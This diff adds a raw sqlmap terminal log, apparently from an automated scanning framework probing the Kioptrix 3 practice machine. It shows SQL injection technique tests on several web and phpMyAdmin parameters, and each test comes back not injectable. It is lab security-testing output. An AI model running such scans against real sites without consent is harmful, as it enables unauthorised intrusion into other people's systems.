@@ -1,0 +1,1043 @@
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m,[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m.[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:26:51 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:26:51[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:26:51[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('PHPSESSID=ae344818da1...478186fbdd'). Do you want to use those [Y/n] Y
+[0m[[36m19:26:52[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:26:52[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:26:52[0m][1m [[32;1mINFO[0m][1m NULL connection is supported with GET method ('[37mRange[0m[1m')[0m
+[[36m19:26:52[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:26:52[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:26:52[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37marchive[0m[1m' might not be injectable[0m
+[[36m19:26:52[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37marchive[0m'
+[[36m19:26:52[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:26:53[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+                                                                               [[36m19:26:53[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait...... (done)
+[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:26:54[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:26:54[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37marchive[0m[1m' does not seem to be injectable[0m
+[[36m19:26:54[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:26:54 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:26:56 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:26:56[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:26:56[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('PHPSESSID=4e38f2c08f5...8fd509fefe'). Do you want to use those [Y/n] Y
+[0m[[36m19:26:56[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:26:57[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:26:57[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mpost[0m[1m' might not be injectable[0m
+[[36m19:26:57[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mpost[0m'
+[[36m19:26:57[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:26:57[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:26:57[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+                                                                               [[36m19:26:58[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait...... (done)
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:26:58[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:26:59[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:26:59[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:26:59[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mpost[0m[1m' does not seem to be injectable[0m
+[[36m19:26:59[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:26:59 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m([01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:27:00 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:27:00[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:27:00[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('PHPSESSID=1ca2a95deee...c82c4d787f'). Do you want to use those [Y/n] Y
+[0m[[36m19:27:00[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:27:01[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:27:01[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mcategory[0m[1m' might not be injectable[0m
+[[36m19:27:01[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mcategory[0m'
+[[36m19:27:01[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:01[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:01[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:01[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+                                                                               [[36m19:27:02[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait...... (done)
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:02[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:27:03[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:03[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mcategory[0m[1m' does not seem to be injectable[0m
+[[36m19:27:03[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:27:03 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m.[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m)[01;49m]     | .'| . |
+|___|_  [[01;41m([01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:27:04 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:27:04[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:27:04[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('PHPSESSID=a38aabd4d2d...6fd7be9271'). Do you want to use those [Y/n] Y
+[0m[[36m19:27:04[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:27:05[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:27:05[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37musername[0m[1m' might not be injectable[0m
+[[36m19:27:05[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37musername[0m'
+[[36m19:27:05[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:05[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:05[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:06[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:07[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37musername[0m[1m' does not seem to be injectable[0m
+[[36m19:27:07[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37mpassword[0m[1m' might not be injectable[0m
+[[36m19:27:07[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37mpassword[0m'
+[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:07[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:08[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37mpassword[0m[1m' does not seem to be injectable[0m
+[[36m19:27:08[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37msystem[0m[1m' might not be injectable[0m
+[[36m19:27:08[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37msystem[0m'
+[[36m19:27:08[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:09[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:10[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37msystem[0m[1m' does not seem to be injectable[0m
+[[36m19:27:10[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mpage[0m[1m' might not be injectable[0m
+[[36m19:27:10[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mpage[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:10[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:11[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:12[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mpage[0m[1m' does not seem to be injectable[0m
+[[36m19:27:12[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:27:12 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m"[01;49m]     | .'| . |
+|___|_  [[01;41m'[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:27:13 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:27:13[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:27:13[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1mgot a 302 redirect to 'http://kioptrix3.com/phpmyadmin/index.php?lang=en-utf-8&convcharset=iso-8859-1&collation_connection=utf8_unicode_ci&token=074a68a968424479d19671c65be68cd6&phpMyAdmin=gmhoBM6k93SoPdxxxk95z69nsL4'. Do you want to follow? [Y/n] Y
+[0m[1mredirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[0m[1myou have not declared cookie(s), while server wants to set its own ('phpMyAdmin=gmhoBM6k93S...k95z69nsL4;pmaCookieVer=4;pmaPass-1=xoall2sVhsM%3D;pmaUser-1=xoall2sVhsM%3D;pma_fontsize=82%25;pma_mcrypt_iv=2atIdSlBw%2Fk%3D'). Do you want to use those [Y/n] Y
+[0m[[36m19:27:13[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:27:14[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[[36m19:27:14[0m] [[33mWARNING[0m] if the problem persists please try to lower the number of used threads (option '[37m--threads[0m')
+[[36m19:27:14[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL
+[[36m19:27:14[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[[36m19:27:14[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL
+[[36m19:27:14[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37mcollation_connection[0m[1m' might not be injectable[0m
+[[36m19:27:14[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[[36m19:27:15[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL
+[[36m19:27:15[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37mcollation_connection[0m'
+[[36m19:27:15[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:15[0m] [[41;37mCRITICAL[0m] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[1mthere seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
+[0m
+[*] ending @ 19:27:15 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m([01;49m]     | .'| . |
+|___|_  [[01;41m'[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:27:17 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:27:17[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[1mGET parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[0m[[36m19:27:17[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('phpMyAdmin=2aDB3A5edK4...Fe%2C-Rdb2;pmaCookieVer=4;pma_fontsize=82%25'). Do you want to use those [Y/n] Y
+[0m[[36m19:27:17[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:27:18[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:27:18[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:27:19[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:27:19[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mlang[0m[1m' might not be injectable[0m
+[[36m19:27:20[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mlang[0m'
+[[36m19:27:20[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:21[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:21[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:21[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:21[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
